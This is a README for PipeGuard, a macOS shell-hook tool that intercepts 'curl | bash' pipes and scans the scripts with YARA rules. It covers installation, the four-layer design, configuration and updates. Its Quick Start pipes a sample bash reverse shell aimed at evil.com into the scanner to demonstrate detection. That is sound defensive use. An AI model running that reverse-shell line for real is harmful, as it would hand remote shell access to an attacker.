# PipeGuard

**Stop malware before it runs. Block `curl | bash` attacks on macOS.**

---

## Quick Start

```bash
# Install via Homebrew (we practice what we preach — no curl | bash)
brew tap securityronin/tap
brew install pipeguard

# Activate shell protection
echo 'source $(brew --prefix)/share/pipeguard/shell/init.sh' >> ~/.zshrc
source ~/.zshrc

# Test protection
echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' | pipeguard scan
```

**Done.** PipeGuard now protects every `curl | bash` command you run.

---

## The Problem

You run this every day:

```bash
curl https://example.com/install.sh | bash
```

Homebrew uses it. Rust uses it. Docker uses it. Developers trust it.

**Attackers exploit this trust.**

In 2024-2025, campaigns like **ClickFix** and **AMOS** use fake CAPTCHAs, poisoned search results, and AI-generated guides to trick users into pasting malicious commands. Microsoft reports a [500% increase](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) in these attacks.

**Your antivirus fails.** Traditional AV scans files on disk. `curl | bash` streams directly to the shell interpreter. No file hits disk. No scan happens. No protection.

---

## What PipeGuard Does

PipeGuard intercepts pipes before execution and scans content in real-time:

1. **Intercepts** - Four-layer defense catches `curl | bash` at the command line, paste, pipe, and audit levels
2. **Filters** - Smart detection skips binaries, scans scripts
3. **Scans** - YARA rules detect malicious patterns
4. **Blocks** - Stops threats before code executes

Three severity levels:
- 🟢 **Low (1-6)** - Warns, allows execution
- 🟡 **Medium (7-8)** - Prompts for confirmation
- 🔴 **High (9-10)** - Blocks execution

---

## Features

**Smart Content Filtering**
- Automatically skips binary files (images, archives, executables)
- Scans shell scripts and installation commands
- Reduces performance overhead on legitimate downloads

**Four-Layer Real-Time Protection**
- **Layer 0: Accept-line interception** — sees full command line (`curl URL | bash`), pre-fetches and scans before execution, TOCTOU-safe
- **Layer 1: ZLE paste interception** — detects pipe-to-shell patterns on paste, warns before Enter
- **Layer 2: Shell wrappers** — wraps `curl`/`wget`, scans piped output as defense-in-depth
- **Layer 3: Preexec audit** — logs all commands and flags pipe-to-shell patterns

**YARA Detection**
- Reverse shells (bash, netcat, Python, Perl)
- Crypto wallet theft patterns
- Persistence mechanisms (crontab, LaunchAgents)
- Supply chain attacks (malicious npm/pip packages)
- Base64 obfuscation and quarantine bypass

**Automatic Updates**
- Cryptographically verified rule updates
- Automatic checks on shell startup (configurable interval)
- One-command rollback if issues arise
- Safe defaults (notify, don't auto-apply)

**Zero Configuration**
- Install once, stays active
- Works with existing shells (bash/zsh)
- Configurable via `~/.config/pipeguard/config.toml`

---

## How It Works

```
User types: curl https://... | bash
                     ↓
    ┌──────────────────────────────────┐
    │  Layer 0: Accept-Line            │  ← Sees full command line
    │  Detects "curl ... | bash"       │     Pre-fetches URL, scans content
    │  Pre-fetch → Scan → Approve?     │     TOCTOU-safe execution
    └─────────────┬────────────────────┘
                  ↓ (if not caught by Layer 0)
    ┌──────────────────────────────────┐
    │  Layer 2: Shell Wrapper          │  ← Defense-in-depth
    │  Intercepts piped curl/wget      │     Catches: command curl | bash
    └─────────────┬────────────────────┘
                  ↓
    ┌──────────────────────────────────┐
    │  Smart Filter                    │
    │  Binary? → Skip  Script? → Scan │
    └─────────────┬────────────────────┘
                  ↓
    ┌──────────────────────────────────┐
    │  YARA Scanner (42 rules)         │
    └─────────────┬────────────────────┘
                  ↓
    ┌──────────────────────────────────┐
    │  Threat Response                 │
    │  Allow / Warn / Prompt / Block   │
    └──────────────────────────────────┘
```

---

## Installation

### Requirements
- macOS (Intel or Apple Silicon)
- Homebrew (for YARA library)
- bash 4+ or zsh

### Install via Homebrew (Recommended)

```bash
brew tap securityronin/tap
brew install pipeguard
```

Then activate shell protection:

```bash
# For zsh (~/.zshrc):
echo 'source $(brew --prefix)/share/pipeguard/shell/init.sh' >> ~/.zshrc

# For bash (~/.bashrc):
echo 'source $(brew --prefix)/share/pipeguard/shell/init.sh' >> ~/.bashrc
```

### Install from Source

```bash
git clone https://github.com/SecurityRonin/pipeguard.git
cd pipeguard
cargo install --path .
```

### Uninstall

```bash
brew uninstall pipeguard
brew untap securityronin/tap
# Remove the source line from your ~/.zshrc or ~/.bashrc
```

---

## Configuration

Edit `~/.config/pipeguard/config.toml`:

```toml
[response]
low = "warn"      # Options: allow, warn, prompt, block
medium = "prompt"
high = "block"

[allowlist]
domains = [
    "brew.sh",
    "raw.githubusercontent.com",
    "rust-lang.org",
]

[updates]
enabled = true                # Enable automatic update checks
auto_apply = false            # Notify but don't auto-apply (safe default)
check_interval_hours = 24     # Check for updates daily
keep_versions = 3             # Keep last 3 versions for rollback
```

### Update Commands

```bash
# Check for updates
pipeguard update check

# Apply available update
pipeguard update apply

# Show current version
pipeguard update status

# Rollback to previous version
pipeguard update rollback --version 1.0.0

# Cleanup old versions
pipeguard update cleanup
```

---

## Status

**Implementation Complete. Testing in Progress.**

- ✅ YARA rule engine (42 rules across 12 threat categories)
- ✅ Four-layer shell interception (bash/zsh)
- ✅ Smart content filtering (binary vs script detection)
- ✅ Automatic updates (Ed25519 verified, rollback support)
- ✅ Installer script
- ✅ Comprehensive test suite (32 tests passing)
- 🔄 Real-world validation
- 🔄 Performance benchmarks

---

## Why PipeGuard?

| Traditional AV | PipeGuard |
|----------------|-----------|
| Scans files on disk | Intercepts pipes before execution |
| Can't distinguish `curl \| bash` from `curl \| jq` | Sees full command line — zero false positives |
| Detects malware after it runs | Pre-fetches and scans before code executes |
| Binary-only protection | Script-aware YARA detection |
| Requires kernel extensions | Works in userspace (shell hooks) |

---

## Technical Documentation

- **Architecture** - See [paper/](paper/) for threat model, detection pipeline, and design decisions
- **YARA Rules** - See [rules/core.yar](rules/core.yar) for detection patterns
- **API Reference** - Run `pipeguard --help` for CLI documentation
- **Testing** - See [tests/](tests/) for test coverage

---

## Contributing

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Research collaboration: albert@securityronin.com

---

## License

MIT License - Copyright (c) 2026 Security Ronin

---

## Enterprise

[**PipeGuard Pro**](https://github.com/SecurityRonin/pipeguard-pro) adds:
- Cloud AI analysis for novel threats
- MDM integration (Jamf, Kandji, Mosyle, Intune)
- Fleet-wide policy enforcement
- Centralized rule distribution
- Audit log aggregation

Contact: enterprise@pipeguard.dev
